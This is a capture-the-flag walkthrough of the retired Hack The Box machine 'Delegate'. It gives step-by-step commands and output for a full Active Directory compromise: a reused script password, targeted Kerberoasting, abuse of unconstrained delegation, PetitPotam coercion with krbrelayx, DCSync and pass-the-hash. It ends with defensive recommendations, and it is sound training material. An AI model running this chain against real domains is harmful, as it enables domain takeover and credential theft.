# Delegate - Hack The Box Write-Up

## Machine Information

| Field | Value |
| --- | --- |
| Machine | Delegate |
| Platform | Hack The Box |
| Operating system | Windows Server 2022 |
| Difficulty | Medium |
| Status | Retired |
| Domain | `delegate.vl` |
| Domain controller | `DC1.delegate.vl` |
| Primary services | DNS, Kerberos, LDAP, SMB, RDP, WinRM, AD Web Services |
| Main techniques | Exposed credentials, password reuse, targeted Kerberoasting, WinRM, unconstrained delegation, Kerberos coercion, DCSync, pass-the-hash |

## Executive Summary

Guest access to the domain controller exposed a logon script in `NETLOGON`. The script contained a hard-coded password for a file-server connection, and the same password was reused by the domain user `A.Briggs`.

BloodHound showed that `A.Briggs` had `GenericWrite` over `N.Thompson`. This permission was used to assign an arbitrary SPN to `N.Thompson`, making the account Kerberoastable. The resulting service ticket was cracked offline, and the recovered password provided a WinRM session as `N.Thompson`.

This second user belonged to the `delegation admins` group and held `SeEnableDelegationPrivilege`. A new computer account named `pwn$` was created and marked as trusted for unconstrained delegation. An AD-integrated DNS record pointed `pwn.delegate.vl` to the attacking host, while the `cifs/pwn` SPN associated that service name with `pwn$`.

Krbrelayx was then started with the machine account key, and PetitPotam coerced the domain controller to authenticate to `pwn`. Because the destination was trusted for unconstrained delegation, the authentication included a forwarded TGT for `DC1$`. Krbrelayx extracted that ticket, which was used to perform DCSync, recover the Administrator NT hash, and obtain an Administrator WinRM session through pass-the-hash.

```mermaid
flowchart LR
    A["Guest reads NETLOGON script"] --> B["Recover reused A.Briggs password"]
    B --> C["GenericWrite over N.Thompson"]
    C --> D["Add SPN and Kerberoast N.Thompson"]
    D --> E["WinRM as N.Thompson"]
    E --> F["Create pwn$ computer account"]
    F --> G["Enable unconstrained delegation"]
    G --> H["Configure DNS and cifs/pwn SPN"]
    H --> I["Coerce DC1$ authentication"]
    I --> J["Extract forwarded DC1$ TGT"]
    J --> K["DCSync Administrator"]
    K --> L["Pass-the-hash WinRM"]
```



## Conventions

This report uses the following placeholders:

| Placeholder | Meaning |
| --- | --- |
| `<TARGET_IP>` | Current lab address of DC1 |
| `<ATTACKER_IP>` | VPN address of the attacking host |
| `<BRIGGS_PASSWORD>` | Password recovered from the logon script and reused by A.Briggs |
| `<THOMPSON_PASSWORD>` | Password recovered through targeted Kerberoasting |
| `<PWN_MACHINE_PASSWORD>` | Password generated for the attacker-controlled computer account |
| `<PWN_MACHINE_NT_HASH>` | NT hash derived from the computer account password |
| `<ADMINISTRATOR_NT_HASH>` | Administrator hash recovered through DCSync |
| `<REDACTED_KERBEROS_TGS>` | Kerberos service-ticket material omitted from the public report |
| `<REDACTED_LM_HASH>` | Unnecessary LM hash field omitted from the public report |

No user or Administrator flag values are included.

## Reconnaissance

### Port Discovery

A full TCP scan identified the services expected on an Active Directory domain controller:

```bash
nmap -p- --min-rate 10000 -Pn <TARGET_IP> -oN nmap/open-ports
```

```text
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
3389/tcp  open  ms-wbt-server
5985/tcp  open  wsman
9389/tcp  open  adws
47001/tcp open  winrm
```

A focused scan identified the host and domain:

```text
Host:             DC1.delegate.vl
Domain:           delegate.vl
Operating system: Windows Server 2022 Build 20348
SMB signing:      enabled and required
SMBv1:            disabled
```

The scan also reported that the domain controller was approximately five minutes ahead of the attacking host. This mattered later because Kerberos rejects requests when the client and KDC clocks differ beyond the permitted tolerance.

The discovered names were added to `/etc/hosts`:

```bash
echo '<TARGET_IP> DC1 DELEGATE delegate.vl DC1.delegate.vl' | sudo tee -a /etc/hosts
```

## SMB Enumeration

### Guest Access to NETLOGON

An empty username authenticated but could not enumerate shares. The explicit Guest account could read `IPC$`, `NETLOGON`, and `SYSVOL`:

```bash
nxc smb <TARGET_IP> -u guest -p '' --shares
```

```text
Share     Permissions
--------  -----------
IPC$      READ
NETLOGON  READ
SYSVOL    READ
```

The `NETLOGON` share contained a batch file:

```bash
smbclient //<TARGET_IP>/NETLOGON -U guest%''
```

```text
smb: \> dir
  users.bat                          A      159
smb: \> get users.bat
```

The script mapped a development share for all users and a backup share only when `A.Briggs` logged on:

```bat
rem @echo off
net use * /delete /y
net use v: \\dc1\development

if %USERNAME%==A.Briggs net use h: \\fileserver\backups /user:Administrator <BRIGGS_PASSWORD>
```

Although the embedded credential was written for the file server's Administrator account, the same password also authenticated the domain user `A.Briggs` against DC1:

```bash
nxc smb <TARGET_IP> -u A.Briggs -p '<BRIGGS_PASSWORD>'
```

```text
[+] delegate.vl\A.Briggs:<BRIGGS_PASSWORD>
```

Password reuse converted an exposed file-server credential into a valid domain foothold.

## Active Directory Enumeration

### BloodHound Collection

Collected the domain with `bloodhound-python`:

```bash
bloodhound-python -c All -d delegate.vl \
  -u A.Briggs -p '<BRIGGS_PASSWORD>' \
  -ns <TARGET_IP> -dc DC1.delegate.vl --zip
```

The imported data exposed a direct ACL path from `A.Briggs` to `N.Thompson`:


`GenericWrite` allowed `A.Briggs` to modify writable attributes on the target user. One such attribute was `servicePrincipalName`, which made a targeted Kerberoasting attack possible.

## Initial Access

### Synchronizing Time

Before performing Kerberos operations, the attacking host should synchronized its clock with the domain controller:

```bash
sudo rdate -n <TARGET_IP>
```

This resolved the clock-skew condition that had prevented BloodHound from obtaining a TGT.

### Targeted Kerberoasting Through GenericWrite

Added an arbitrary SPN added to `N.Thompson`:

```bash
bloodyAD -d delegate.vl --dc-ip <TARGET_IP> \
  -u A.Briggs -p '<BRIGGS_PASSWORD>' \
  set object N.Thompson servicePrincipalName -v http/anything
```

```text
[+] N.Thompson's servicePrincipalName has been updated
```

Once an account owns an SPN, any authenticated domain user can request a service ticket for it. The KDC encrypts the ticket with key material derived from the SPN owner's password, allowing the ticket to be attacked offline:

```bash
impacket-GetUserSPNs -dc-ip <TARGET_IP> \
  -request -request-user N.Thompson \
  'delegate.vl/A.Briggs:<BRIGGS_PASSWORD>'
```

```text
ServicePrincipalName  Name        MemberOf
--------------------  ----------  -----------------------------------------------
http/anything         N.Thompson  CN=delegation admins,CN=Users,DC=delegate,DC=vl

$krb5tgs$23$*N.Thompson$DELEGATE.VL$<REDACTED_KERBEROS_TGS>
```

Saved The ticket and tested against a wordlist:

```bash
hashcat N.Thompson.krb5tgs /usr/share/wordlists/rockyou.txt
```

```text
<REDACTED_KERBEROS_TGS>:<THOMPSON_PASSWORD>
```

Tested if the recovered password can provided a WinRM shell:

```bash
evil-winrm -i <TARGET_IP> -u N.Thompson -p '<THOMPSON_PASSWORD>'
```

```text
*Evil-WinRM* PS C:\Users\N.Thompson\Documents> whoami
delegate\n.thompson
```

## Privilege Escalation

### Delegation Privileges

The new session exposed two important rights:

```powershell
whoami /priv
```

```text
Privilege Name                Description                                                    State
============================= ============================================================== =======
SeMachineAccountPrivilege     Add workstations to domain                                     Enabled
SeEnableDelegationPrivilege   Enable computer and user accounts to be trusted for delegation Enabled
```

Domain group enumeration showed why these rights were available:

```powershell
net user N.Thompson /domain
```

```text
Local Group Memberships      *Remote Management Users
Global Group memberships     *delegation admins    *Domain Users
```

An LDAP query confirmed that the custom group's purpose was to allow delegation configuration:

```text
dn: CN=delegation admins,CN=Users,DC=delegate,DC=vl
description: Group to allow delegation in the domain
member: CN=N.Thompson,CN=Users,DC=delegate,DC=vl
member: CN=J.Roberts,CN=Users,DC=delegate,DC=vl
```

`SeEnableDelegationPrivilege` was the critical capability: it permitted `N.Thompson` to mark an account as trusted for delegation. The ability to create a computer account supplied an attacker-controlled object on which to set that flag.

### Creating an Attacker-Controlled Computer

Enumerated existing delegation configuration:

```bash
impacket-findDelegation 'delegate.vl/N.Thompson:<THOMPSON_PASSWORD>'
```

```text
AccountName  AccountType  DelegationType  DelegationRightsTo  SPN Exists
-----------  -----------  --------------  ------------------  ----------
DC1$         Computer     Unconstrained   N/A                 Yes
```

The escalation did not depend on taking control of `DC1$`. Instead, a new computer account was created with attacker-known credentials:

```bash
impacket-addcomputer -dc-ip <TARGET_IP> -computer-name pwn \
  'delegate.vl/N.Thompson:<THOMPSON_PASSWORD>'
```

```text
Successfully added machine account pwn$ with password <PWN_MACHINE_PASSWORD>.
```

Used the enabled delegation right  to add `TRUSTED_FOR_DELEGATION` to the computer's `userAccountControl` flags:

```bash
bloodyAD -u N.Thompson -d delegate.vl -p '<THOMPSON_PASSWORD>' \
  --host <TARGET_IP> add uac 'pwn$' -f TRUSTED_FOR_DELEGATION
```

```text
[-] ['TRUSTED_FOR_DELEGATION'] property flags added to pwn$'s userAccountControl
```

The KDC would now treat services running as `pwn$` as trusted for unconstrained delegation. When an account authenticated to such a service with a forwardable ticket, the service could receive and cache a delegated copy of that account's TGT.

### Preparing DNS and the Service Principal Name

Two additional pieces connected the attacker-controlled computer object to the attacking host.

First, an AD-integrated DNS record made `pwn.delegate.vl` resolve to the VPN address:

```bash
python3 krbrelayx/dnstool.py \
  -u 'delegate.vl\N.Thompson' -p '<THOMPSON_PASSWORD>' \
  -r pwn.delegate.vl -d <ATTACKER_IP> --action add <TARGET_IP>
```

```text
[+] Bind OK
[+] LDAP operation completed successfully
```

Second, the `cifs/pwn` SPN was assigned to `pwn$`:

```bash
python3 krbrelayx/addspn.py \
  -u 'delegate.vl\N.Thompson' -p '<THOMPSON_PASSWORD>' \
  -s cifs/pwn -t 'pwn$' -dc-ip <TARGET_IP> <TARGET_IP>
```

```text
[+] Found modification target
[+] SPN Modified successfully
```

The SPN told Kerberos that `pwn$` owned the CIFS service named `pwn`, while DNS directed network traffic for that name to the attacking host.

Finally, the machine account password was converted to its NT hash so Krbrelayx could use the account's RC4 key:

```bash
python3 -c 'import hashlib,binascii; print(binascii.hexlify(hashlib.new("md4","<PWN_MACHINE_PASSWORD>".encode("utf-16le")).digest()).decode())'
```

```text
<PWN_MACHINE_NT_HASH>
```

### Capturing the Domain Controller TGT

Krbrelayx was started in unconstrained-delegation export mode:

```bash
python3 krbrelayx/krbrelayx.py \
  -hashes :<PWN_MACHINE_NT_HASH> \
  --interface-ip <ATTACKER_IP>
```

```text
Running in export mode (all tickets will be saved to disk).
Running in unconstrained delegation abuse mode using the specified credentials.
Setting up SMB Server
Setting up HTTP Server on port 80
Setting up DNS Server
Servers started, waiting for connections
```

The machine account key allowed Krbrelayx to decrypt Kerberos authentication intended for SPNs owned by `pwn$` and extract any forwarded TGT embedded for unconstrained delegation.

In a second terminal, PetitPotam called the domain controller's EFSRPC interface and supplied `pwn` as the listener name:

```bash
python3 PetitPotam/PetitPotam.py \
  -target-ip <TARGET_IP> \
  -u 'pwn$' -p '<PWN_MACHINE_PASSWORD>' \
  pwn dc1.delegate.vl
```

The tool successfully used exposed function:

```text
[-] Sending EfsRpcOpenFileRaw!
[-] Got RPC_ACCESS_DENIED!! EfsRpcOpenFileRaw is probably PATCHED!
[+] OK! Using unpatched function!
[-] Sending EfsRpcEncryptFileSrv!
[+] Got expected ERROR_BAD_NETPATH exception!!
[+] Attack worked!
```

DC1 resolved `pwn` to the attacking host and requested a service ticket for `cifs/pwn`. Because that SPN belonged to the unconstrained-delegation account, the authentication carried a forwarded TGT for the domain controller machine account. Krbrelayx extracted and saved it:

```text
SMBD: Received connection from <TARGET_IP>
Got ticket for DC1$@DELEGATE.VL [krbtgt@DELEGATE.VL]
Saving ticket in DC1$@DELEGATE.VL_krbtgt@DELEGATE.VL.ccache
```

At this point, the attacker possessed a valid TGT for `DC1$`.

### DCSync as DC1$

The ticket was renamed and loaded into the Kerberos credential cache:

```bash
mv 'DC1$@DELEGATE.VL_krbtgt@DELEGATE.VL.ccache' krbtgt.ccache
export KRB5CCNAME="$(pwd)/krbtgt.ccache"
```

Domain controller machine accounts have directory-replication privileges. Presenting the `DC1$` TGT therefore allowed `secretsdump` to request the Administrator account's secrets through DRSUAPI:

```bash
impacket-secretsdump -just-dc-user Administrator -k dc1.delegate.vl
```

```text
Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:<REDACTED_LM_HASH>:<ADMINISTRATOR_NT_HASH>:::
Kerberos keys grabbed
```

The recovered NT hash was used for pass-the-hash authentication over WinRM:

```bash
evil-winrm -i dc1.delegate.vl -u Administrator -H <ADMINISTRATOR_NT_HASH>
```

```text
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
delegate\administrator
```

This completed the compromise of the domain controller as the domain Administrator account.

## Security Observations

| Observation | Impact | Recommended control |
| --- | --- | --- |
| Guest could read `NETLOGON` | An unauthenticated user could access domain logon material | Disable Guest access and restrict SMB shares to authenticated principals with a business requirement |
| A password was embedded in `users.bat` | Anyone who could read the share obtained a reusable secret | Remove credentials from scripts and use managed service identities, gMSAs, or an approved secrets platform |
| The exposed password was reused by `A.Briggs` | A file-server secret became a valid domain credential | Enforce unique passwords across accounts and security boundaries |
| `A.Briggs` had `GenericWrite` over another user | A low-privileged account could modify the target and create a Kerberoasting path | Review AD ACLs, remove unnecessary write rights, and monitor sensitive attribute changes such as SPN additions |
| `N.Thompson` used a crackable password | A requested RC4 service ticket disclosed the account through offline cracking | Use long random passwords or gMSAs, prefer AES Kerberos encryption, and monitor unusual TGS requests |
| `N.Thompson` could configure trusted delegation | Compromise of one user allowed creation of an unconstrained-delegation endpoint | Restrict `SeEnableDelegationPrivilege` to tightly controlled administrators and replace unconstrained delegation with constrained designs |
| A user-controlled computer account could be created | The attacker obtained an AD object with a known key | Set `ms-DS-MachineAccountQuota` to `0` when self-service joins are unnecessary and delegate joins through controlled workflows |
| The domain controller could authenticate to an attacker-directed CIFS service | Its forwarded TGT was exposed to an unconstrained-delegation host | Block outbound SMB from domain controllers to unapproved destinations, restrict coercible RPC interfaces, and protect privileged accounts from delegation |
| A domain controller TGT enabled DCSync | Compromise of a DC machine credential led directly to domain secrets | Monitor replication requests, ticket anomalies, new computer accounts, delegation flag changes, and unexpected DNS/SPN modifications |

## Key Lessons

1. Logon scripts and shared configuration files should be treated as credential-bearing attack surfaces.
2. `GenericWrite` over a user can become an initial-access path when it permits an attacker to create an SPN and perform targeted Kerberoasting.
3. Kerberos depends on synchronized time; enumeration output such as `KRB_AP_ERR_SKEW` should be resolved before continuing with ticket-based attacks.
4. `SeEnableDelegationPrivilege` is highly sensitive because it can turn an attacker-controlled computer account into a credential-capture point.
5. DNS, SPNs, account keys, and delegation flags each serve a different role in unconstrained-delegation abuse; the attack succeeds only when all four align.
6. Coercing a domain controller to an unconstrained-delegation service can expose its forwarded TGT, which carries far more authority than a single service ticket.
7. A domain controller machine account can perform directory replication, allowing its TGT to support DCSync and full domain compromise.

## References

- [Hack The Box: Delegate machine profile](https://www.hackthebox.com/machines/delegate)
- [Microsoft Learn: Trust computer and user accounts for delegation](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/security-policy-settings/enable-computer-and-user-accounts-to-be-trusted-for-delegation)
- [Microsoft Learn: MS-DS-Machine-Account-Quota attribute](https://learn.microsoft.com/en-us/windows/win32/adschema/a-ms-ds-machineaccountquota)
- [Dirk-jan Mollema: Krbrelayx](https://github.com/dirkjanm/krbrelayx)
- [Topotam: PetitPotam](https://github.com/topotam/PetitPotam)
- [Fortra: Impacket](https://github.com/fortra/impacket)
- [CravateRouge: BloodyAD](https://github.com/CravateRouge/bloodyAD)
